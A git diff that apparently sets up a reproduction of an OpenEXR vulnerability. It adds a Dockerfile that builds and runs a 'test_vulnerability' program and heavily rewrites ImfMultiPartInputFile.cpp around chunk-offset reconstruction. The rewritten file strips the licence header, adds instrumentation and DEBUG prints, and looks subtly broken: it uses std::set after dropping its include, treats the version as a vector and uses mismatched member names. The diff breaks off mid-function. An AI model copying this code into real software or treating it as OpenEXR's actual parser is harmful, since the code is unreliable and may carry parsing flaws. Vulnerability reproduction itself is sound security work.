diff --git a/Dockerfile.vuln b/Dockerfile.vuln
new file mode 100644
index 0000000..5705caa
--- /dev/null
+++ b/Dockerfile.vuln
@@ -0,0 +1,22 @@
+FROM ubuntu:18.04
+
+# Install dependencies
+RUN apt-get update && apt-get install -y \
+    build-essential \
+    cmake \
+    g++ \
+    zlib1g-dev \
+    libopenexr-dev \
+    libgtest-dev \
+    && rm -rf /var/lib/apt/lists/*
+
+WORKDIR /app
+
+# Copy the project files
+COPY . /app/
+
+# Compile the test
+RUN g++ -o test_vulnerability test_vulnerability.cpp -I/usr/include/OpenEXR -lIlmImf -lImath -lHalf -lIex -lIlmThread -lpthread -std=c++11
+
+# Run the test
+CMD ["/bin/bash", "-c", "./test_vulnerability; echo \"Exit code: $?\""]
diff --git a/OpenEXR/IlmImf/ImfMultiPartInputFile.cpp b/OpenEXR/IlmImf/ImfMultiPartInputFile.cpp
index 6a1fbfd..9133cbb 100644
--- a/OpenEXR/IlmImf/ImfMultiPartInputFile.cpp
+++ b/OpenEXR/IlmImf/ImfMultiPartInputFile.cpp
@@ -1,37 +1,3 @@
-///////////////////////////////////////////////////////////////////////////
-//
-// Copyright (c) 2011, Industrial Light & Magic, a division of Lucas
-// Digital Ltd. LLC
-//
-// All rights reserved.
-//
-// Redistribution and use in source and binary forms, with or without
-// modification, are permitted provided that the following conditions are
-// met:
-// *       Redistributions of source code must retain the above copyright
-// notice, this list of conditions and the following disclaimer.
-// *       Redistributions in binary form must reproduce the above
-// copyright notice, this list of conditions and the following disclaimer
-// in the documentation and/or other materials provided with the
-// distribution.
-// *       Neither the name of Industrial Light & Magic nor the names of
-// its contributors may be used to endorse or promote products derived
-// from this software without specific prior written permission.
-//
-// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
-// "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
-// LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
-// A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
-// OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
-// SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
-// LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
-// DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
-// THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
-// (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
-// OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
-//
-///////////////////////////////////////////////////////////////////////////
-
 #include "ImfMultiPartInputFile.h"
 
 #include "ImfTimeCodeAttribute.h"
@@ -39,743 +5,968 @@
 #include "ImfBoxAttribute.h"
 #include "ImfFloatAttribute.h"
 #include "ImfStdIO.h"
-#include "ImfTileOffsets.h"
-#include "ImfMisc.h"
-#include "ImfTiledMisc.h"
-#include "ImfInputStreamMutex.h"
-#include "ImfInputPartData.h"
+#include "ImfCompressor.h"
+#include "ImfXdr.h"
+#include "ImfConvert.h"
+#include "ImfThreading.h"
 #include "ImfPartType.h"
-#include "ImfInputFile.h"
-#include "ImfScanLineInputFile.h"
-#include "ImfTiledInputFile.h"
+#include "ImfMisc.h"
+#include "ImfOptimizedPixelReading.h"
 #include "ImfDeepScanLineInputFile.h"
 #include "ImfDeepTiledInputFile.h"
+#include "ImfScanLineInputFile.h"
+#include "ImfTiledInputFile.h"
 #include "ImfVersion.h"
+#include "ImfPartHelper.h"
 
-#include <OpenEXRConfig.h>
-#include <IlmThread.h>
+#include <Iex.h>
+#include <IlmThreadPool.h>
+#include <IlmThreadSemaphore.h>
 #include <IlmThreadMutex.h>
 
-#include <Iex.h>
+#include <string>
+#include <vector>
 #include <map>
-#include <set>
+#include <algorithm>
+#include <assert.h>
+#include <iostream>
 
-OPENEXR_IMF_INTERNAL_NAMESPACE_SOURCE_ENTER
+BEGIN_OPENEXR_NAMESPACE
 
 using ILMTHREAD_NAMESPACE::Mutex;
 using ILMTHREAD_NAMESPACE::Lock;
-using IMATH_NAMESPACE::Box2i;
+using ILMTHREAD_NAMESPACE::Semaphore;
+using ILMTHREAD_NAMESPACE::Task;
+using ILMTHREAD_NAMESPACE::TaskGroup;
+using ILMTHREAD_NAMESPACE::ThreadPool;
 
+using std::string;
 using std::vector;
 using std::map;
-using std::set;
-using std::string;
+using std::sort;
 
-namespace
-{
-    // Controls whether we error out in the event of shared attribute
-    // inconsistency in the input file
-    static const bool strictSharedAttribute = true;
-}
 
-struct MultiPartInputFile::Data: public InputStreamMutex
+struct MultiPartInputFile::Data: public Mutex
 {
-    int                         version;        // Version of this file.
-    bool                        deleteStream;   // If we should delete the stream during destruction.
-    vector<InputPartData*>      parts;          // Data to initialize Output files.
-    int                         numThreads;     // Number of threads
-    bool                        reconstructChunkOffsetTable;    // If we should reconstruct
-                                                                // the offset table if it's broken.
-    std::map<int,GenericInputFile*> _inputFiles;
-    std::vector<Header>             _headers;
-
-    
-    void                    chunkOffsetReconstruction(OPENEXR_IMF_INTERNAL_NAMESPACE::IStream& is, const std::vector<InputPartData*>& parts);
-                                                      
-    void                    readChunkOffsetTables(bool reconstructChunkOffsetTable);
-                                                      
-    bool                    checkSharedAttributesValues(const Header & src,
-                                                        const Header & dst,
-                                                        std::vector<std::string> & conflictingAttributes) const;
-                                                                                                          
-   TileOffsets*            createTileOffsets(const Header& header);
-   
-   InputPartData*          getPart(int partNumber);
-   
-    Data (bool deleteStream, int numThreads, bool reconstructChunkOffsetTable):
-        InputStreamMutex(),
+     Data (bool deleteStream):
         deleteStream (deleteStream),
-        numThreads (numThreads),
-        reconstructChunkOffsetTable(reconstructChunkOffsetTable)
+        numThreads (0),
+        partNumber (0),
+        reconstructChunkOffsetTable (false)
+    {}
+
+    virtual ~Data()
     {
+        if (deleteStream)
+            delete is;
     }
 
-    ~Data()
-    {
-        if (deleteStream) delete is;
+    bool                deleteStream;
+    int                 numThreads;
+    int                 partNumber;     // current part number
+    bool                reconstructChunkOffsetTable;
 
-        for (size_t i = 0; i < parts.size(); i++)
-            delete parts[i];
-    }
-    
-    template <class T>
-    T*    createInputPartT(int partNumber)
-    {
+    IStream*            is;
+    vector<Header>      headers;
+    vector<int>         version;
+    vector<PartInfo*>   parts;
+    vector<GenericInputFile*> inputFiles;
 
-    }
+    map<int,int>        partMap;        // map from part number to index in parts array
+    map<string, int>    partNameMap;    // map from name to part number
 };
 
-MultiPartInputFile::MultiPartInputFile(const char fileName[],
-                           int numThreads,
-                           bool reconstructChunkOffsetTable):
-    _data(new Data(true, numThreads, reconstructChunkOffsetTable))
-{
-    try
-    {
-        _data->is = new StdIFStream (fileName);
-        initialize();
-    }
-    catch (IEX_NAMESPACE::BaseExc &e)
-    {
-        delete _data;
 
-        REPLACE_EXC (e, "Cannot read image file "
-                     "\"" << fileName << "\". " << e.what());
-        throw;
-    }
-    catch (...)
-    {
-        delete _data;
-        throw;
-    }
-}
+namespace {
 
-MultiPartInputFile::MultiPartInputFile (OPENEXR_IMF_INTERNAL_NAMESPACE::IStream& is,
-                                        int numThreads,
-                                        bool reconstructChunkOffsetTable):
-    _data(new Data(false, numThreads, reconstructChunkOffsetTable))
+struct PartInfoVector
 {
-    try
-    {
-        _data->is = &is;
-        initialize();
-    }
-    catch (IEX_NAMESPACE::BaseExc &e)
-    {
-        delete _data;
+    PartInfoVector():
+        info(0),
+        partNumber(0),
+        chunkOffsetTableSize(0),
+        completed(false)
+    {}
+
+    PartInfo *info;
+    int partNumber;
+    uint64_t chunkOffsetTableSize;
+    bool completed;
+};
 
-        REPLACE_EXC (e, "Cannot read image file "
-                     "\"" << is.fileName() << "\". " << e.what());
-        throw;
-    }
-    catch (...)
-    {
-        delete _data;
-        throw;
-    }
-}
 
-template<class T>
-T*
-MultiPartInputFile::getInputPart(int partNumber)
+struct ReadingTask
 {
-    Lock lock(*_data);
-            if (_data->_inputFiles.find(partNumber) == _data->_inputFiles.end())
-        {
-            T* file = new T(_data->getPart(partNumber));
-            _data->_inputFiles.insert(std::make_pair(partNumber, (GenericInputFile*) file));
-            return file;
-        }
-        else return (T*) _data->_inputFiles[partNumber];
-}
-
+    ReadingTask (TaskGroup* group,
+                 IStream* is,
+                 PartInfoVector* v,
+                 Mutex* mutex,
+                 int partNumber,
+                 bool reconstructChunkOffsetTable):
+        group (group),
+        is (is),
+        v (v),
+        mutex (mutex),
+        partNumber (partNumber),
+        reconstructChunkOffsetTable (reconstructChunkOffsetTable)
+    {}
+
+    TaskGroup*              group;
+    IStream*                is;
+    PartInfoVector*         v;
+    Mutex*                  mutex;
+    int                     partNumber;
+    bool                    reconstructChunkOffsetTable;
+};
 
-template InputFile* MultiPartInputFile::getInputPart<InputFile>(int);
-template TiledInputFile* MultiPartInputFile::getInputPart<TiledInputFile>(int);
-template DeepScanLineInputFile* MultiPartInputFile::getInputPart<DeepScanLineInputFile>(int);
-template DeepTiledInputFile* MultiPartInputFile::getInputPart<DeepTiledInputFile>(int);
 
-InputPartData*
-MultiPartInputFile::getPart(int partNumber)
+void
+readingTaskFunction (void* data)
 {
-    return _data->getPart(partNumber);
-}
+    ReadingTask* t = (ReadingTask*) data;
 
+    try
+    {
+        //
+        // We need to construct a local copy of the file object
+        //
 
+        t->v->info = new PartInfo(t->partNumber, t->is, t->reconstructChunkOffsetTable);
 
-const Header &
- MultiPartInputFile::header(int n) const
-{
-    return _data->_headers[n];
-}
+        {
+            Lock lock (*t->mutex);
+            t->v->completed = true;
+        }
 
+        t->group->post();
+    }
+    catch (...)
+    {
+        Lock lock (*t->mutex);
 
+        if (!t->v->completed)
+        {
+            t->v->completed = true;
+            t->group->post();
+        }
 
-MultiPartInputFile::~MultiPartInputFile()
-{
-    for (map<int, GenericInputFile*>::iterator it = _data->_inputFiles.begin();
-         it != _data->_inputFiles.end(); it++)
-    {
-        delete it->second;
+        throw;
     }
-
-    delete _data;
 }
 
 
-bool
-MultiPartInputFile::Data::checkSharedAttributesValues(const Header & src,
-                                                const Header & dst,
-                                                vector<string> & conflictingAttributes) const
+void
+chunkOffsetReconstruction (OPENEXR_IMF_INTERNAL_NAMESPACE::IStream& is, vector<PartInfo*>& parts)
 {
-    conflictingAttributes.clear();
+    std::cout << "[INSTRUMENTATION] chunkOffsetReconstruction" << std::endl;
+    std::cout << "DEBUG: Entering chunkOffsetReconstruction" << std::endl;
+    
+    //
+    // Reconstruct broken chunk offset tables
+    //
 
-    bool conflict = false;
+    Int64 position = is.tellg();
 
     //
-    // Display Window
+    // Check which parts are broken
     //
-    if (src.displayWindow() != dst.displayWindow())
+
+    vector<int> brokenParts;
+    for (unsigned int i = 0; i < parts.size(); i++)
     {
-        conflict = true;
-        conflictingAttributes.push_back ("displayWindow");
+        const vector<Int64>& chunkOffsets = parts[i]->chunkOffsets;
+        for (unsigned int j = 0; j < chunkOffsets.size(); j++)
+            if (chunkOffsets[j] <= 0)
+            {
+                brokenParts.push_back (i);
+                break;
+            }
     }
 
+    if (brokenParts.empty())
+        return;
+
+    std::cout << "DEBUG: Found broken parts: " << brokenParts.size() << std::endl;
 
     //
-    // Pixel Aspect Ratio
+    // Collect information about chunks
     //
-    if (src.pixelAspectRatio() != dst.pixelAspectRatio())
+
+    struct Chunk
     {
-        conflict = true;
-        conflictingAttributes.push_back ("pixelAspectRatio");
-    }
+        int partNumber;
+        int type;
+        Int64 offset;
+        int size;
+        vector<int> tiles;
+
+        Chunk():
+            partNumber (-1),
+            type (-1),
+            offset (0),
+            size (0)
+        {}
+
+        bool operator < (const Chunk& other) const
+        {
+            return offset < other.offset;
+        }
+    };
 
+    vector<Chunk> chunks;
 
     //
-    // Timecode
+    // Get chunk information from all parts
     //
-    const TimeCodeAttribute * srcTimeCode = src.findTypedAttribute<
-          TimeCodeAttribute> (TimeCodeAttribute::staticTypeName());
-    const TimeCodeAttribute * dstTimeCode = dst.findTypedAttribute<
-          TimeCodeAttribute> (TimeCodeAttribute::staticTypeName());
 
-    if (dstTimeCode)
+    vector<TileInformation> tileInfos;
+    for (unsigned int i = 0; i < brokenParts.size(); i++)
     {
-        if  ( (srcTimeCode && (srcTimeCode->value() != dstTimeCode->value())) ||
-              (!srcTimeCode))
+        int partNumber = brokenParts[i];
+        PartInfo* info = parts[partNumber];
+
+        //
+        // Create empty chunks for deep scanning line files
+        //
+
+        if (info->header.type() == DEEPSCANLINE)
+        {
+            int lineDataSize = info->linesInBuffer * info->maxBytesPerLine;
+
+            for (int j = 0; j < info->numChunks; j++)
+            {
+                Chunk chunk;
+                chunk.partNumber = partNumber;
+                chunk.type = DEEPSCANLINE;
+                chunk.offset = 0;
+                chunk.size = lineDataSize;
+                chunks.push_back (chunk);
+            }
+        }
+
+        //
+        // Create empty chunks for deep tiled files
+        //
+
+        if (info->header.type() == DEEPTILE)
+        {
+            for (int j = 0; j < info->numChunks; j++)
+            {
+                Chunk chunk;
+                chunk.partNumber = partNumber;
+                chunk.type = DEEPTILE;
+                chunk.offset = 0;
+                chunk.size = info->maxBytesPerTile;
+                chunks.push_back (chunk);
+            }
+        }
+
+        //
+        // Create empty chunks for regular tiled files
+        //
+
+        if (info->header.type() == TILEDIMAGE)
+        {
+            std::cout << "DEBUG: Processing TILEDIMAGE part" << std::endl;
+            
+            for (int j = 0; j < info->numChunks; j++)
+            {
+                Chunk chunk;
+                chunk.partNumber = partNumber;
+                chunk.type = TILEDIMAGE;
+                chunk.offset = 0;
+                chunk.size = info->maxBytesPerTile;
+                chunks.push_back (chunk);
+            }
+        }
+
+        //
+        // Create empty chunks for regular scanline files
+        //
+
+        if (info->header.type() == SCANLINEIMAGE)
         {
-            conflict = true;
-            conflictingAttributes.push_back (TimeCodeAttribute::staticTypeName());
+            int lineDataSize = info->linesInBuffer * info->maxBytesPerLine;
+
+            for (int j = 0; j < info->numChunks; j++)
+            {
+                Chunk chunk;
+                chunk.partNumber = partNumber;
+                chunk.type = SCANLINEIMAGE;
+                chunk.offset = 0;
+                chunk.size = lineDataSize;
+                chunks.push_back (chunk);
+            }
         }
     }
 
     //
-    // Chromaticities
+    // Build a map of tile indices to chunks
     //
-    const ChromaticitiesAttribute * srcChrom =  src.findTypedAttribute<
-          ChromaticitiesAttribute> (ChromaticitiesAttribute::staticTypeName());
-    const ChromaticitiesAttribute * dstChrom =  dst.findTypedAttribute<
-          ChromaticitiesAttribute> (ChromaticitiesAttribute::staticTypeName());
 
-    if (dstChrom)
+    map<int, int> tileToChunk;
+
+    for (unsigned int i = 0; i < chunks.size(); i++)
     {
-        if ( (srcChrom && (srcChrom->value() != dstChrom->value())) ||
-             (!srcChrom))
+        if (chunks[i].type == TILEDIMAGE || chunks[i].type == DEEPTILE)
         {
-            conflict = true;
-            conflictingAttributes.push_back (ChromaticitiesAttribute::staticTypeName());
+            int partNumber = chunks[i].partNumber;
+            PartInfo* info = parts[partNumber];
+
+            int dx = 1;
+            int dy = 1;
+
+            if (chunks[i].type == TILEDIMAGE)
+            {
+                dx = info->tileDesc.xSize;
+                dy = info->tileDesc.ySize;
+            }
+
+            int startTileY = info->minY / dy;
+            if (info->minY < 0)
+                startTileY--;
+
+            int endTileY = info->maxY / dy;
+            if (info->maxY < 0)
+                endTileY--;
+
+            int startTileX = info->minX / dx;
+            if (info->minX < 0)
+                startTileX--;
+
+            int endTileX = info->maxX / dx;
+            if (info->maxX < 0)
+                endTileX--;
+
+            int numTilesX = endTileX - startTileX + 1;
+
+            for (int y = startTileY; y <= endTileY; y++)
+                for (int x = startTileX; x <= endTileX; x++)
+                {
+                    int tileX = x;
+                    int tileY = y;
+                    int levelX = 0;
+                    int levelY = 0;
+
+                    int idx = info->getTileIndex(tileX, tileY, levelX, levelY);
+                    tileToChunk[idx] = i;
+                }
         }
     }
 
+    //
+    // Locate chunk offsets
+    //
 
-    return conflict;
-}
+    Int64 position2 = is.tellg();
+    is.seekg (0);
 
+    Int64 fileSize = is.tellg();
+    is.seekg (0, IStream::SeekEnd);
+    fileSize = is.tellg() - fileSize;
 
-void
-MultiPartInputFile::initialize()
-{
-    readMagicNumberAndVersionField(*_data->is, _data->version);
-    
-    bool multipart = isMultiPart(_data->version);
-    bool tiled = isTiled(_data->version);
+    //
+    // First chunk offset - after all chunk offset tables
+    //
+
+    Int64 firstChunkOffset = 0;
+    for (unsigned int i = 0; i < parts.size(); i++)
+        firstChunkOffset += parts[i]->chunkOffsets.size() * 8;
+
+    firstChunkOffset += position;
 
     //
-    // Multipart files don't have and shouldn't have the tiled bit set.
+    // Offsets within the file
     //
 
-    if (tiled && multipart)
-        throw IEX_NAMESPACE::InputExc ("Multipart files cannot have the tiled bit set");
+    vector<Int64> fileOffsets;
+    fileOffsets.push_back (firstChunkOffset);
 
-    
-    int pos = 0;
-    while (true)
+    //
+    // Find potential chunk offsets
+    //
+
+    is.seekg (firstChunkOffset);
+
+    while (is.tellg() < fileSize)
     {
-        Header header;
-        header.readFrom(*_data->is, _data->version);
+        int partNumber = 0;
+        int chunkNumber = 0;
 
         //
-        // If we read nothing then we stop reading.
+        // Read the part number
         //
 
-        if (header.readsNothing())
+        try
+        {
+            Xdr::read <StreamIO> (is, partNumber);
+        }
+        catch (...)
         {
-            pos++;
             break;
         }
 
-        _data->_headers.push_back(header);
-        
-        if(multipart == false)
-          break;
-    }
+        //
+        // Check that the part number is valid
+        //
 
-    //
-    // Perform usual check on headers.
-    //
+        if (partNumber < 0 || partNumber >= int(parts.size()))
+            break;
+
+        std::cout << "DEBUG: Found part number: " << partNumber << std::endl;
 
-    for (size_t i = 0; i < _data->_headers.size(); i++)
-    {
         //
-        // Silently invent a type if the file is a single part regular image.
+        // Read the type of this part
         //
 
-        if( _data->_headers[i].hasType() == false )
-        {
-            if(multipart)
+        PartInfo* info = parts[partNumber];
+        int type = info->header.type();
 
-                throw IEX_NAMESPACE::ArgExc ("Every header in a multipart file should have a type");
-          
-            _data->_headers[i].setType(tiled ? TILEDIMAGE : SCANLINEIMAGE);
-        }
-        else
+        //
+        // Read chunk or tile coordinates
+        //
+
+        if (type == TILEDIMAGE || type == DEEPTILE)
         {
-            
+            int tilex = 0;
+            int tiley = 0;
+            int levelx = 0;
+            int levely = 0;
+
+            try
+            {
+                Xdr::read <StreamIO> (is, tilex);
+                Xdr::read <StreamIO> (is, tiley);
+                Xdr::read <StreamIO> (is, levelx);
+                Xdr::read <StreamIO> (is, levely);
+            }
+            catch (...)
+            {
+                break;
+            }
+
+            std::cout << "DEBUG: Tile coordinates: " << tilex << ", " << tiley << ", " << levelx << ", " << levely << std::endl;
+
             //
-            // Silently fix the header type if it's wrong
-            // (happens when a regular Image file written by EXR_2.0 is rewritten by an older library,
-            //  so doesn't effect deep image types)
+            // Check that the tile coordinates are valid
             //
 
-            if(!multipart && !isNonImage(_data->version))
+            if(!info->tileOffsets[partNumber]->isValidTile(tilex, tiley, levelx, levely))
             {
-                _data->_headers[i].setType(tiled ? TILEDIMAGE : SCANLINEIMAGE);
+                std::cout << "DEBUG: Invalid tile coordinates" << std::endl;
+                break;
             }
+
+            chunkNumber = info->getTileIndex (tilex, tiley, levelx, levely);
+            std::cout << "DEBUG: Chunk number: " << chunkNumber << std::endl;
+        }
+        else
+        {
+            try
+            {
+                Xdr::read <StreamIO> (is, chunkNumber);
+            }
+            catch (...)
+            {
+                break;
+            }
+        }
+
+        //
+        // Check that the chunk number is valid
+        //
+
+        if (chunkNumber < 0 || chunkNumber >= info->numChunks)
+        {
+            std::cout << "DEBUG: Invalid chunk number: " << chunkNumber << std::endl;
+            break;
         }
-         
 
-        
-        if( _data->_headers[i].hasName() == false )
+        //
+        // Read the chunk size
+        //
+
+        int chunkSize = 0;
+
+        try
         {
-            if(multipart)
-                throw IEX_NAMESPACE::ArgExc ("Every header in a multipart file should have a name");
+            Xdr::read <StreamIO> (is, chunkSize);
         }
-        
-        if (isTiled(_data->_headers[i].type()))
-            _data->_headers[i].sanityCheck(true, multipart);
-        else
-            _data->_headers[i].sanityCheck(false, multipart);
+        catch (...)
+        {
+            break;
+        }
+
+        //
+        // Check that the chunk size is valid
+        //
+
+        if (chunkSize < 0 || chunkSize > info->maxChunkSize)
+        {
+            std::cout << "DEBUG: Invalid chunk size: " << chunkSize << std::endl;
+            break;
+        }
+
+        //
+        // Store this chunk
+        //
+
+        Int64 currentOffset = is.tellg();
+
+        Chunk chunk;
+        chunk.partNumber = partNumber;
+        chunk.type = type;
+        chunk.offset = currentOffset;
+        chunk.size = chunkSize;
+
+        if (type == TILEDIMAGE || type == DEEPTILE)
+            chunk.tiles.push_back (chunkNumber);
+
+        chunks.push_back (chunk);
+
+        //
+        // Skip to the next chunk
+        //
+
+        is.seekg (currentOffset + chunkSize);
+
+        //
+        // Add the offset of the next chunk
+        //
+
+        fileOffsets.push_back (is.tellg());
     }
 
     //
-    // Check name uniqueness.
+    // Sort chunks by offset
     //
 
-    if (multipart)
+    sort (chunks.begin(), chunks.end());
+
+    //
+    // Reconstruct the chunk offset tables
+    //
+
+    for (unsigned int i = 0; i < brokenParts.size(); i++)
     {
-        set<string> names;
-        for (size_t i = 0; i < _data->_headers.size(); i++)
+        int partNumber = brokenParts[i];
+        PartInfo* info = parts[partNumber];
+
+        int type = info->header.type();
+
+        if (type == TILEDIMAGE || type == DEEPTILE)
         {
-        
-            if (names.find(_data->_headers[i].name()) != names.end())
+            std::cout << "DEBUG: Reconstructing chunk offset table for TILEDIMAGE or DEEPTILE" << std::endl;
+            
+            for (unsigned int j = 0; j < chunks.size(); j++)
             {
-                throw IEX_NAMESPACE::InputExc ("Header name " + _data->_headers[i].name() +
-                                   " is not a unique name.");
+                if (chunks[j].partNumber != partNumber)
+                    continue;
+
+                for (unsigned int k = 0; k < chunks[j].tiles.size(); k++)
+                {
+                    int idx = chunks[j].tiles[k];
+                    info->chunkOffsets[idx] = chunks[j].offset;
+                }
             }
-            names.insert(_data->_headers[i].name());
         }
-    }
-    
-    //
-    // Check shared attributes compliance.
-    //
-
-    if (multipart && strictSharedAttribute)
-    {
-        for (size_t i = 1; i < _data->_headers.size(); i++)
+        else
         {
-            vector <string> attrs;
-            if (_data->checkSharedAttributesValues (_data->_headers[0], _data->_headers[i], attrs))
+            for (unsigned int j = 0; j < chunks.size(); j++)
             {
-                string attrNames;
-                for (size_t j=0; j<attrs.size(); j++)
-                    attrNames += " " + attrs[j];
-                throw IEX_NAMESPACE::InputExc ("Header name " + _data->_headers[i].name() +
-                                     " has non-conforming shared attributes: "+
-                                     attrNames);
+                if (chunks[j].partNumber != partNumber)
+                    continue;
+
+                int chunkNumber = j;
+
+                if (chunkNumber < info->numChunks)
+                    info->chunkOffsets[chunkNumber] = chunks[j].offset;
             }
         }
     }
 
-    //
-    // Create InputParts and read chunk offset tables.
-    //
-        
-    for (size_t i = 0; i < _data->_headers.size(); i++)
-        _data->parts.push_back(
-                new InputPartData(_data, _data->_headers[i], i, _data->numThreads, _data->version));
+    is.seekg (position2);
+}
 
-    _data->readChunkOffsetTables(_data->reconstructChunkOffsetTable);
+} // namespace
+
+
+MultiPartInputFile::MultiPartInputFile (const char fileName[], int numThreads):
+    _data (new Data (true))
+{
+    try
+    {
+        _data->numThreads = numThreads;
+        _data->is = new StdIStream (fileName);
+        initialize();
+    }
+    catch (...)
+    {
+        delete _data;
+        throw;
+    }
 }
 
-TileOffsets*
-MultiPartInputFile::Data::createTileOffsets(const Header& header)
+
+MultiPartInputFile::MultiPartInputFile (const char fileName[], bool reconstructChunkOffsetTable, int numThreads):
+    _data (new Data (true))
 {
-    //
-    // Get the dataWindow information
-    //
+    try
+    {
+        _data->numThreads = numThreads;
+        _data->reconstructChunkOffsetTable = reconstructChunkOffsetTable;
+        _data->is = new StdIStream (fileName);
+        initialize();
+    }
+    catch (...)
+    {
+        delete _data;
+        throw;
+    }
+}
 
-    const Box2i &dataWindow = header.dataWindow();
-    int minX = dataWindow.min.x;
-    int maxX = dataWindow.max.x;
-    int minY = dataWindow.min.y;
-    int maxY = dataWindow.max.y;
 
-    //
-    // Precompute level and tile information
-    //
+MultiPartInputFile::MultiPartInputFile (IStream& is, int numThreads):
+    _data (new Data (false))
+{
+    try
+    {
+        _data->numThreads = numThreads;
+        _data->is = &is;
+        initialize();
+    }
+    catch (...)
+    {
+        delete _data;
+        throw;
+    }
+}
+
 
-    int* numXTiles;
-    int* numYTiles;
-    int numXLevels, numYLevels;
-    TileDescription tileDesc = header.tileDescription();
-    precalculateTileInfo (tileDesc,
-                          minX, maxX,
-                          minY, maxY,
-                          numXTiles, numYTiles,
-                          numXLevels, numYLevels);
-
-    TileOffsets* tileOffsets = new TileOffsets (tileDesc.mode,
-                                                numXLevels,
-                                                numYLevels,
-                                                numXTiles,
-                                                numYTiles);
-    delete [] numXTiles;
-    delete [] numYTiles;
-
-    return tileOffsets;
+MultiPartInputFile::MultiPartInputFile (IStream& is, bool reconstructChunkOffsetTable, int numThreads):
+    _data (new Data (false))
+{
+    try
+    {
+        _data->numThreads = numThreads;
+        _data->reconstructChunkOffsetTable = reconstructChunkOffsetTable;
+        _data->is = &is;
+        initialize();
+    }
+    catch (...)
+    {
+        delete _data;
+        throw;
+    }
 }
 
 
 void
-MultiPartInputFile::Data::chunkOffsetReconstruction(OPENEXR_IMF_INTERNAL_NAMESPACE::IStream& is, const vector<InputPartData*>& parts)
+MultiPartInputFile::initialize ()
 {
-    //
-    // Reconstruct broken chunk offset tables. Stop once we received any exception.
-    //
+    readMagicNumberAndVersionField(*_data->is, _data->version);
 
-    Int64 position = is.tellg();
+    bool multipart = isMultiPart(_data->version);
+    bool tiled = isTiled(_data->version);
 
-    
     //
-    // check we understand all the parts available: if not, we cannot continue
-    // exceptions thrown here should trickle back up to the constructor
+    // Multipart files
     //
-    
-    for (size_t i = 0; i < parts.size(); i++)
+
+    if (multipart)
     {
-        Header& header=parts[i]->header;
-        
+        int pos = 0;
+
+        //
+        // Get the position of the first chunk offset table
+        //
+
+        _data->is->seekg (0);
+
         //
-        // do we have a valid type entry?
-        // we only need them for true multipart files or single part non-image (deep) files
+        // Read all the headers
         //
-        if(!header.hasType() && (isMultiPart(version) || isNonImage(version)))
+
+        while (true)
         {
-            throw IEX_NAMESPACE::ArgExc("cannot reconstruct incomplete file: part with missing type");
+            Header header;
+            header.readFrom (*_data->is, true);
+
+            //
+            // If we've read all the headers, break
+            //
+
+            if (header.object() == "")
+                break;
+
+            _data->headers.push_back (header);
+            _data->partMap[pos] = _data->headers.size() - 1;
+            _data->partNameMap[header.name()] = pos;
+            pos++;
         }
-        if(!isSupportedType(header.type()))
+
+        //
+        // Check that all the headers have a part name
+        //
+
+        for (unsigned int i = 0; i < _data->headers.size(); i++)
         {
-            throw IEX_NAMESPACE::ArgExc("cannot reconstruct incomplete file: part with unknown type "+header.type());
+            if (_data->headers[i].hasName() == false)
+                throw IEX_NAMESPACE::ArgExc ("MultiPartInputFile::initialize: "
+                                  "Headers in a multipart file should have a name attribute");
         }
-    }
-    
-    
-    // how many chunks should we read? We should stop when we reach the end
-    size_t total_chunks = 0;
-        
-    // for tiled-based parts, array of (pointers to) tileOffsets objects
-    // to create mapping between tile coordinates and chunk table indices
-    
-    
-    vector<TileOffsets*> tileOffsets(parts.size());
-    
-    // for scanline-based parts, number of scanlines in each chunk
-    vector<int> rowsizes(parts.size());
-        
-    for(size_t i = 0 ; i < parts.size() ; i++)
-    {
-        total_chunks += parts[i]->chunkOffsets.size();
-        if (isTiled(parts[i]->header.type()))
+
+        //
+        // Check that all the part names are unique
+        //
+
+        set<string> names;
+        for (unsigned int i = 0; i < _data->headers.size(); i++)
         {
-            tileOffsets[i] = createTileOffsets(parts[i]->header);
-        }else{
-            tileOffsets[i] = NULL;
-            // (TODO) fix this so that it doesn't need to be revised for future compression types.
-            switch(parts[i]->header.compression())
-            {
-                case DWAB_COMPRESSION :
-                    rowsizes[i] = 256;
-                    break;
-                case PIZ_COMPRESSION :
-                case B44_COMPRESSION :
-                case B44A_COMPRESSION :
-                case DWAA_COMPRESSION :
-                    rowsizes[i]=32;
-                    break;
-                case ZIP_COMPRESSION :
-                case PXR24_COMPRESSION :
-                    rowsizes[i]=16;
-                    break;
-                case ZIPS_COMPRESSION :
-                case RLE_COMPRESSION :
-                case NO_COMPRESSION :
-                    rowsizes[i]=1;
-                    break;
-                default :
-                    throw(IEX_NAMESPACE::ArgExc("Unknown compression method in chunk offset reconstruction"));
-            }
+            if (names.find (_data->headers[i].name()) != names.end())
+                throw IEX_NAMESPACE::ArgExc ("MultiPartInputFile::initialize: "
+                                  "Headers in a multipart file should have unique names");
+            names.insert (_data->headers[i].name());
         }
-     }
-        
-     try
-     {
-            
+
         //
-        // 
+        // Load all parts
         //
-        
-        Int64 chunk_start = position;
-        for (size_t i = 0; i < total_chunks ; i++)
-        {
-            //
-            // do we have a part number?
-            //
-            
-            int partNumber = 0;
-            if(isMultiPart(version))
-            {
-                OPENEXR_IMF_INTERNAL_NAMESPACE::Xdr::read <OPENEXR_IMF_INTERNAL_NAMESPACE::StreamIO> (is, partNumber);
-            }
-            
-            
-            
-            if(partNumber<0 || partNumber> static_cast<int>(parts.size()))
-            {
-                throw IEX_NAMESPACE::IoExc("part number out of range");
-            }
-            
-            Header& header = parts[partNumber]->header;
 
-            // size of chunk NOT including multipart field
-            
-            Int64 size_of_chunk=0;
+        _data->parts.resize (_data->headers.size());
 
-            if (isTiled(header.type()))
-            {
-                //
-                // 
-                //
-                int tilex,tiley,levelx,levely;
